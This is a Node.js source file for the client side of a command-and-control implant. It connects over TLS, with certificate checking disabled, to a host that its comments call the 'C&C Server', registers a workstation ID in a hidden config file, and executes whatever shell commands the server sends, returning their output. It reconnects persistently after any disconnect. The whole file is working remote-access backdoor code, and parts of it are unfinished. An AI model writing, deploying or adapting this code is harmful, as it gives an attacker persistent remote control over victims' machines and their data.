"use strict";
const tls = require('tls')
const fs = require('fs')
const child = require('child_process')
const { exec } = require('child_process');

/**
 * options object stores the private key and public cert to be used by tls socket for traffic encryption.
 */
const _options = {
    key: fs.readFileSync(__dirname + '/certs/host.key'),
    cert: fs.readFileSync(__dirname + '/certs/host.crt'),
    rejectUnauthorized: false
}

// flag variable to let the client know if it needs to reconnect to the server
const _fsPort = 2223 // File socket port
const _comPort = 443 // Communication Socket port
const _host = '127.0.0.1' // C&C Server
const _shellType = "sh" //cmd.exe, zsh, sh
const _EOT_ = '|||' // Characters to identify end of transmission per write (not per packet)
const _CONFIG_PATH_ = '/.RSconf'
// ===========================================================================

// Global variables
let fsClient = {}
let comAlive = false
let workstationId
let buffer = ''
// ===========================================================================

const readConfig = (configPath) => {
    try {
        var configData = fs.readFileSync(__dirname + _CONFIG_PATH_)
        configData = JSON.parse(configData)
        workstationId = configData.id
    } catch (e) {
        console.log(`No Config Found: ${e}`)
    }
}

const sendClientConfig = (serverSocket) => {
    var msg = {
        'type': 'existingClient',
        'id': workstationId
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const setupConfig = (JBuffer) => {
    try {
        fs.writeFileSync(__dirname + _CONFIG_PATH_, JSON.stringify(JBuffer))
    } catch (e) {
        console.log(`Error saving config: ${e}`)
    }
}

const setupRequest = (serverSocket) => {
    var msg = {
        'type': 'setupRequest'
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const execCommand = (JBuffer, serverSocket) => {

    exec(JBuffer.data, {
        timeout: 30000,
    },(error, stdout, stderr) => {
        if (error) {
            console.log('here')

            var msg = {
                'type': 'execResponse',
                'data': String(error)
            }
            serverSocket.write(JSON.stringify(msg) + _EOT_)
            return
        }
        var msg = {
            'type': 'execResponse',
            'data': stdout
        }
        console.log(msg)
        serverSocket.write(JSON.stringify(msg) + _EOT_)
    })
}

const echoTest = (JBuffer, serverSocket) => {
    var msg = {
        'type': 'echo',
        'data': JBuffer.data
    }
    serverSocket.write(JSON.stringify(msg) + _EOT_)
}

const bufferInterpreter = (JBuffer, serverSocket) => {
    switch (JBuffer.type) {
        case 'setup':
            setupConfig(JBuffer)
            break
        case 'echo':
            echoTest(JBuffer, serverSocket)
            break
        case 'exec':
            execCommand(JBuffer, serverSocket)
            break
    }
}

// async await wrapper to make certain functions async
const asyncCall = (callback) => new Promise((resolve) => {
    callback(resolve)
})

/**
 * establishes connection to a file socket server using information below.
 * Connection will be persistant and be reattempted every 1000ms on disconnect
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @param {socket} comClient 
 * @param {function} cb 
 * @returns socket
 */
const fsServerConnect = (PORT, HOST, tlsCerts, comClient, cb) => {
    const client = tls.connect(PORT, HOST, tlsCerts)

    // Connection is established to server
    client.on('secure', () => {
        console.log(`Connected to port ${PORT}`)
        if (cb) {
            cb(client)
        }

        // If the communication socket is alive and connection ID has been assigned, resync it (important for filesockets)
        if (comAlive && connID) {
            console.log(connID)
            client.write('_+4' + connID)
        }
    })

    // if the file socket dropped, attempt to reconnect
    client.on('close', () => {
        console.log(`${PORT} connection closed... reconnecting...`)
        client.destroy()
        if (comAlive == true) {
            setTimeout(() => {
                fsClient = fsServerConnect(PORT, HOST, tlsCerts, cb)
            }, 1000)
        }
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    client.on('error', (error) => {
        console.log(error)
        client.destroy()
    })

    return client
}

/**
 * creates a connection to a communication socket server.
 * connection is persistant and will attempt to reconnect every 5s
 * @param {number} PORT 
 * @param {string} HOST 
 * @param {object} tlsCerts 
 * @returns socket
 */
const comServerConnect = (PORT, HOST, tlsCerts) => {
    const serverSocket = tls.connect(PORT, HOST, tlsCerts)

    // On Successful TLS socket connection, spawn shell
    serverSocket.on('secure', async () => {
        // comAlive = true
        console.log(`Connected to port ${PORT}`)

        if (workstationId == undefined) {
            setupRequest(serverSocket)
        } else {
            sendClientConfig(serverSocket)
        }

        // fsClient = await asyncCall((resolve) => {
        //     return fsServerConnect(_fsPort, _host, _options, client, resolve)
        // })
        // shellSpawn(client)
    })

    serverSocket.on('data', (data) => {
        var dataString = data.toString()
        var endOfTransmissionIndex = dataString.indexOf('|||')
        if (endOfTransmissionIndex > 0) {
            buffer += dataString.substr(0, endOfTransmissionIndex)

            console.log(buffer)
            var JBuffer
            try {
                JBuffer = JSON.parse(buffer)
                bufferInterpreter(JBuffer, serverSocket)
            } catch (e) {
                console.log('Buffer was messed up... try again') //SEND MESSAGE TO SERVER
                JBuffer = ''
                buffer = ''
            }
            
            buffer = ''
        } else {
            buffer += data
        }
    })

    // On socket close, attempt to reconnect
    serverSocket.on('close', () => {
        comAlive = false
        console.log(`${PORT} connection closed... reconnecting...`)
        // fsClient.destroy()
        serverSocket.destroy()
        setTimeout(() => {
            comServerConnect(PORT, HOST, tlsCerts)
        }, 5000)
    })

    // if the socket throws an error, destroy the socket, and attempt to reconnect with new socket
    serverSocket.on('error', (error) => {
        comAlive = false
        console.log(error)
        // fsClient.destroy()
        serverSocket.destroy()
    })

    return serverSocket
}

readConfig(_CONFIG_PATH_)
comServerConnect(_comPort, _host, _options)
